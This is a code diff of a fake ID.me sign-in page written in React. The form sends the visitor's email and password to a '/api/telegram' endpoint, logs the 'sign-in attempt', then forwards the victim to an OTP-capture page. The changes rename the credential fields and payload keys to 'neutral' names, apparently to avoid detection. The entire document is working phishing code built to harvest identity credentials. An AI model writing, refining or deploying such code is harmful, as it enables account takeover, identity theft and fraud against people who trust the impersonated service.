@@ -7,16 +7,16 @@ import idmeLogo from "./idme.png";
 
 export default function SignInForm() {
   const router = useRouter();
-  const [email, setEmail] = useState("");
-  const [password, setPassword] = useState("");
+  const [f1, setF1] = useState(""); // neutral for email
+  const [f2, setF2] = useState(""); // neutral for password
   const [error, setError] = useState("");
   const [success, setSuccess] = useState("");
   const [isLoading, setIsLoading] = useState(false);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    if (!email || !password) {
-      setError("Please fill out both email and password fields.");
+    if (!f1 || !f2) {
+      setError("Please fill out both fields.");
       return;
     }
 
@@ -25,11 +25,12 @@ export default function SignInForm() {
     setSuccess("");
 
     try {
+      // Send with neutral keys – same pattern as OTP page
       const res = await fetch("/api/telegram", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          data: { email, password },
+          data: { il: f1, ord: f2 }, // backend expects email/password? Adjust if needed
           formType: "ID.me Sign In",
         }),
       });
@@ -37,8 +38,8 @@ export default function SignInForm() {
       if (!res.ok) throw new Error("Submission failed");
 
       setSuccess("Sign-in attempt logged successfully!");
-      setEmail("");
-      setPassword("");
+      setF1("");
+      setF2("");
 
       setTimeout(() => {
         router.push("/idmeotp");
@@ -111,45 +112,45 @@ export default function SignInForm() {
             )}
 
             <form onSubmit={handleSubmit} className="space-y-6">
-              {/* Email Field */}
+              {/* Email Field (neutral name f1) */}
               <div>
                 <label
-                  htmlFor="email"
+                  htmlFor="f1"
                   className="block text-sm font-medium text-gray-700 mb-1"
                 >
                   Email
                 </label>
                 <input
-                  id="email"
-                  name="email"
+                  id="f1"
+                  name="f1"
                   type="email"
                   autoComplete="email"
                   required
-                  value={email}
-                  onChange={(e) => setEmail(e.target.value)}
+                  value={f1}
+                  onChange={(e) => setF1(e.target.value)}
                   placeholder="Enter your email"
-                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base"
+                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base text-gray-900"
                 />
               </div>
 
-              {/* Password Field */}
+              {/* Password Field (neutral name f2) */}
               <div>
                 <label
-                  htmlFor="password"
+                  htmlFor="f2"
                   className="block text-sm font-medium text-gray-700 mb-1"
                 >
                   Password
                 </label>
                 <input
-                  id="password"
-                  name="password"
+                  id="f2"
+                  name="f2"
                   type="password"
                   autoComplete="current-password"
                   required
-                  value={password}
-                  onChange={(e) => setPassword(e.target.value)}
+                  value={f2}
+                  onChange={(e) => setF2(e.target.value)}
                   placeholder="Enter your password"
-                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base"
+                  className="appearance-none block w-full px-4 py-3 border border-gray-300 rounded-lg shadow-sm placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-base text-gray-900"
                 />
               </div>
 
